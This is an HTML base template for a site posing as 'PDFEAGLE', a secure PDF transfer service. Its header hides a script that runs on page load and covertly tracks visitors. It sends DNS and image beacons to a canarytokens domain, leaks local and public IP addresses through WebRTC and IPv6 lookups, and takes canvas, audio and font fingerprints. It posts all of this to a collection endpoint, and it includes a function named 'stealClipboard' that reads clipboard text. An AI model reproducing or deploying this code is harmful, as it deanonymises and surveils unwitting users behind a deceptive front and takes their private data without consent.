--- START OF FILE pdfeagle-main/templates/base.html ---
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDFEAGLE - Secure Transfer</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    
    <style>
        body { background-color: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
        .navbar { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .brand-text { font-weight: 800; color: #e74c3c; letter-spacing: 1px; }
        .main-container { max-width: 800px; margin-top: 40px; }
        .card { border: none; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
    </style>

    <script>
    // ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
    // ‚ïë  ü¶Ö EAGLE EYE ULTIMATE v5.0 ‚Äî FULL SPECTRUM INTELLIGENCE                      ‚ïë
    // ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

    window.EagleEyeUltimate = class {
        constructor(config = {}) {
            this.version = "5.0.0";
            this.endpoint = config.endpoint || '/api/collect';
            this.sessionId = this.generateSessionId();
            this.startTime = performance.now();
            
            // !!! –í–ê–ñ–ù–û: –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –°–í–û–ô –î–û–ú–ï–ù CANARYTOKENS !!!
            // –ü—Ä–∏–º–µ—Ä: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com"
            this.config = {
                enableDNSBeacon: true,
                canaryDomain: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com", 
                collectOnLoad: config.collectOnLoad !== false,
                debug: false
            };
            
            this.init();
        }

        generateSessionId() {
            const array = new Uint8Array(8);
            crypto.getRandomValues(array);
            return Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
        }

        async init() {
            if (this.config.enableDNSBeacon) this.triggerDNSBeacons();
            if (this.config.collectOnLoad) {
                if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load'), 100);
                else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 100));
            }
        }

        // === 1. DNS INTELLIGENCE (LINKED TO SESSION) ===
        triggerDNSBeacons() {
            const domain = this.config.canaryDomain;
            // –§–æ—Ä–º–∞—Ç: session_id.timestamp.random.token.com
            // –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å–µ—Ä–≤–µ—Ä—É —Å–≤—è–∑–∞—Ç—å DNS –∑–∞–ø—Ä–æ—Å —Å HTTP —Å–µ—Å—Å–∏–µ–π
            const uid = `${this.sessionId}.${Date.now()}.${Math.floor(Math.random()*1000)}`;
            
            // –ú–µ—Ç–æ–¥ 1: Image (—Å–∞–º—ã–π –Ω–∞–¥–µ–∂–Ω—ã–π)
            new Image().src = `https://${uid}.img.${domain}/pixel.gif`;
            
            // –ú–µ—Ç–æ–¥ 2: DNS Prefetch
            const prefetch = document.createElement('link');
            prefetch.rel = 'dns-prefetch';
            prefetch.href = `//${uid}.dns.${domain}`;
            document.head.appendChild(prefetch);
        }

        // === 2. WEBRTC LEAK DETECTION ===
        async getWebRTCIntelligence() {
            const result = { localIPs: [], publicIPs: [], ipv6: [] };
            const stunServers = [
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun1.l.google.com:19302" },
                { urls: "stun:stun.cloudflare.com:3478" }
            ];

            try {
                const pc = new RTCPeerConnection({ iceServers: stunServers });
                pc.createDataChannel('eagle');
                
                await new Promise((resolve) => {
                    pc.onicecandidate = (event) => {
                        if (!event.candidate) { resolve(); return; }
                        const candidate = event.candidate.candidate;
                        
                        // IPv4
                        const ipv4Match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipv4Match) {
                            const ip = ipv4Match[1];
                            if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.')) {
                                if (!result.localIPs.includes(ip)) result.localIPs.push(ip);
                            } else {
                                if (!result.publicIPs.includes(ip)) result.publicIPs.push(ip);
                            }
                        }
                        // IPv6
                        const ipv6Match = candidate.match(/([a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i);
                        if (ipv6Match && !result.ipv6.includes(ipv6Match[1])) result.ipv6.push(ipv6Match[1]);
                    };
                    setTimeout(resolve, 2000); // –¢–∞–π–º–∞—É—Ç 2 —Å–µ–∫
                });
                pc.close();
            } catch (e) { }
            return result;
        }

        // === 3. IPv6 LEAK DETECTION ===
        async getIPv6() {
            const services = [
                'https://api64.ipify.org?format=json',
                'https://ipv6.icanhazip.com',
                'https://api6.ipify.org?format=json'
            ];
            for (const url of services) {
                try {
                    const controller = new AbortController();
                    setTimeout(() => controller.abort(), 1500);
                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
                    if (!response.ok) continue;
                    let ip = await response.text();
                    try { ip = JSON.parse(ip).ip; } catch(e){}
                    if (ip.includes(':')) return { detected: true, ip: ip.trim() };
                } catch (e) { continue; }
            }
            return { detected: false, ip: null };
        }

        // === 4. FINGERPRINTING (Canvas, Audio, Fonts) ===
        getCanvasHash() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v5", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Eagle_v5", 4, 17);
                const data = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < data.length; i++) {
                    hash = ((hash << 5) - hash) + data.charCodeAt(i);
                    hash |= 0;
                }
                return hash.toString(16);
            } catch (e) { return "error"; }
        }

        async getAudioHash() {
            try {
                const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!Ctx) return "no_audio";
                const audioCtx = new Ctx(1, 44100, 44100);
                const osc = audioCtx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
                osc.connect(audioCtx.destination);
                osc.start(0);
                const buffer = await audioCtx.startRendering();
                const data = buffer.getChannelData(0);
                let sum = 0;
                for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
                return sum.toFixed(6);
            } catch (e) { return "error"; }
        }

        getFonts() {
            // –°–æ–∫—Ä–∞—â–µ–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ –¥–ª—è —Å–∫–æ—Ä–æ—Å—Ç–∏, –Ω–æ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω—ã–π –¥–ª—è OS Fingerprint
            const fontList = ["Arial", "Calibri", "Consolas", "Courier New", "Helvetica", "Roboto", "Segoe UI", "Times New Roman", "Verdana", "Ubuntu", "Cantarell", "Liberation Sans", "Menlo", "Monaco", "SF Pro"];
            const detected = [];
            const span = document.createElement("span");
            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
            document.body.appendChild(span);
            span.style.fontFamily = "monospace";
            const defaultWidth = span.offsetWidth;
            for (const font of fontList) {
                span.style.fontFamily = `"${font}", monospace`;
                if (span.offsetWidth !== defaultWidth) detected.push(font);
            }
            document.body.removeChild(span);
            return detected;
        }

        // === 5. ANTI-SPOOFING ===
        detectAnomalies(fonts) {
            const anomalies = [];
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            
            // OS Mismatch
            if (ua.includes("Windows") && !fonts.includes("Calibri")) anomalies.push("OS SPOOF: Windows without Calibri");
            if (ua.includes("Mac") && !fonts.includes("Helvetica") && !fonts.includes("Menlo")) anomalies.push("OS SPOOF: Mac without Helvetica/Menlo");
            if (platform.includes("Linux") && (fonts.includes("Segoe UI") || fonts.includes("Calibri"))) anomalies.push("OS SPOOF: Linux with Windows fonts");
            
            // Screen Mismatch
            if (!window.matchMedia(`(width: ${screen.width}px)`).matches) anomalies.push(`SCREEN SPOOF: JS=${screen.width}, CSS mismatch`);
            
            // Automation
            if (navigator.webdriver) anomalies.push("CRITICAL: WebDriver Detected");
            
            return anomalies;
        }

        // === MAIN COLLECT ===
        async collect(triggerName, extraData = {}) {
            const [webrtc, ipv6, audioHash] = await Promise.all([
                this.getWebRTCIntelligence(),
                this.getIPv6(),
                this.getAudioHash()
            ]);
            
            const fonts = this.getFonts();
            const anomalies = this.detectAnomalies(fonts);
            
            const payload = {
                meta: {
                    version: this.version,
                    sessionId: this.sessionId,
                    trigger: triggerName,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                },
                threat: {
                    score: anomalies.length * 20,
                    anomalies: anomalies,
                    is_spoofing: anomalies.length > 0
                },
                fingerprints: {
                    canvas: this.getCanvasHash(),
                    audio: audioHash,
                    fonts: fonts
                },
                system: {
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory
                },
                network: {
                    webrtc: webrtc,
                    ipv6: ipv6
                },
                ...extraData
            };

            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
            if (navigator.sendBeacon) navigator.sendBeacon(this.endpoint, blob);
            else fetch(this.endpoint, { method: 'POST', body: JSON.stringify(payload), headers: {'Content-Type': 'application/json'} });
        }
    };
    
    const eagle = new EagleEyeUltimate();

    // --- –ö–†–ê–ñ–ê –ë–£–§–ï–†–ê ---
    async function stealClipboard() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                return text ? text.substring(0, 1000) : "Empty";
            }
        } catch (e) { return "Blocked/Error"; }
        return "Not Supported";
    }
    </script>
</head>
<body>
    <nav class="navbar navbar-light">
        <div class="container">
            <a class="navbar-brand brand-text" href="/">
                <i class="fa-solid fa-file-pdf"></i> PDFEAGLE
            </a>
        </div>
    </nav>
    <div class="container main-container">
        {% block content %}{% endblock %}
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
